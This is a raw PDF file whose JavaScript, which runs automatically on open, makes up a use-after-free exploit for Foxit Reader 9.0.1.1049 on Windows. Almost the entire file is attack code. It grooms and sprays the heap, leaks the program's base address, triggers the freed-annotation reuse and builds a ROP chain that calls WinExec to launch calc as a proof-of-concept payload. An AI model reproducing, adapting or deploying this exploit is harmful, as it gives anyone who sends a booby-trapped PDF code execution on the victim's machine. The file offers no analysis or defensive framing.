%PDF 
1 0 obj
<</Pages 1 0 R /OpenAction 2 0 R>> 
2 0 obj
<</S /JavaScript /JS (

var heap_ptr   = 0;
var foxit_base = 0;
var say_no_to_heap_spray = [];

var num_of_abs = 0x80
var length_of_abs = 0x40

function activate_lfh(size){
    var arr = new Array(size);
    for(var i = 0; i < size; i++){
        arr[i] = this.addAnnot({type: "Text"});
        if (typeof arr[i] == "object"){
            arr[i].destroy();
        }
    }
}

function leak_everything(){
    activate_lfh(0x400);

    // Allocate heap chunks so that the (freed) annotate object will point to our controlled allocated heap chunks
    for (var i = 0; i < num_of_abs; i++){
        say_no_to_heap_spray[i] = new Int32Array(new ArrayBuffer(length_of_abs));
    }

    var ab = new ArrayBuffer(0x5c);
    var intAb = new Int32Array(ab);
    var leaked = intAb[0] & 0xffff0000;
    foxit_base = leaked - 0x01f50000;
    heap_ptr   = intAb[1];
    debug_address("foxit_base", foxit_base);
    debug_address("heap_ptr", heap_ptr);
    for (var i = 0; i < num_of_abs; i++){
        for (var j = 0; j < say_no_to_heap_spray[i].length; j++){
            say_no_to_heap_spray[i][j] = foxit_base + 0x01a7ee23; // push ecx; pop esp; pop ebp; ret 4 // 02c7ee23
        }
    }
    debug_address("heap_ptr", heap_ptr);
}

function heap_spray(size){
    var arr = new Array(size);
    for (var i = 0; i < arr.length; i++) {
        // re-claim and stack pivot-0x8
        arr[i] = new ArrayBuffer(0x10000-0x8);//0xFFF8 // 0x0aa40000-0x0ba0f000: 0b0b0b0b
        var claimed = new Int32Array(arr[i]);
        var c_length = claimed.length;
        claimed[0] = 0x54303057
        for (var j = 1; j < c_length; j++) {
            claimed[j] = 0x41414141;
        }
    }
}

function use_heap_leak(){ 
    var arr = new Array(0x10);
    for (var i = 0; i < arr.length; i++) {
        arr[i] = new ArrayBuffer(0x5c);
        var rop = new Int32Array(arr[i]);
        for (var j = 0x0; j < rop.length; j++) {
            rop[0x00] = heap_ptr;                // pointer to our stack pivot from the TypedArray leak
            rop[0x01] = foxit_base + 0x01a11d09; // xor ebx,ebx; or [eax],eax; ret
            rop[0x02] = 0x72727272;              // junk
            rop[0x03] = foxit_base + 0x00001450  // pop ebp; ret
            rop[0x04] = 0xffffffff;              // ret of WinExec
            rop[0x05] = foxit_base + 0x0069a802; // pop eax; ret
            rop[0x06] = foxit_base + 0x01f2257c; // IAT WinExec
            rop[0x07] = foxit_base + 0x0000c6c0; // mov eax,[eax]; ret
            rop[0x08] = foxit_base + 0x00049d4e; // xchg esi,eax; ret
            rop[0x09] = foxit_base + 0x00025cd6; // pop edi; ret
            rop[0x0a] = foxit_base + 0x0041c6ca; // ret
            rop[0x0b] = foxit_base + 0x000254fc; // pushad; ret
            rop[0x0c] = 0x636c6163;              // calc
            rop[0x0d] = 0x00000000;              // adios, amigo
        }
    }
}

function use_heap_spray(){ 
    var arr = new Array(0x10);
    for (var i = 0; i < arr.length; i++) {
        arr[i] = new ArrayBuffer(0x5c);
        var rop = new Int32Array(arr[i]);
        for (var j = 0x0; j < rop.length; j++) {
            rop[j] = 0x1b000048-0x8;
        }
    }
}

function trigger_uaf(){
    var that = this;
    var a = this.addAnnot({type:"Text", page: 0, name:"uaf"});
    var arr = [1];
    Object.defineProperties(arr,{
        "0":{ 
            get: function () {

                // free
                that.getAnnot(0, "uaf").destroy();

                // reclaim freed memory
                //use_heap_spray();
                use_heap_leak();
                return 1; 
            }
        }
    });
    // re-use
    a.point = arr;
}

function debug(statement) {
    app.alert(util.printf("%s", statement));
}

function debug_address(statement, number) {
    app.alert(util.printf("%s 0x%08x", statement, number));
}

function main(){
    //heap_spray(0x1000);
    leak_everything();
    
    trigger_uaf();
}

if (app.platform == "WIN"){
    if (app.isFoxit == "Foxit Reader"){
        if (app.appFoxitVersion == "9.0.1.1049"){
            main();
        }
    }
}

)>> trailer <</Root 1 0 R>>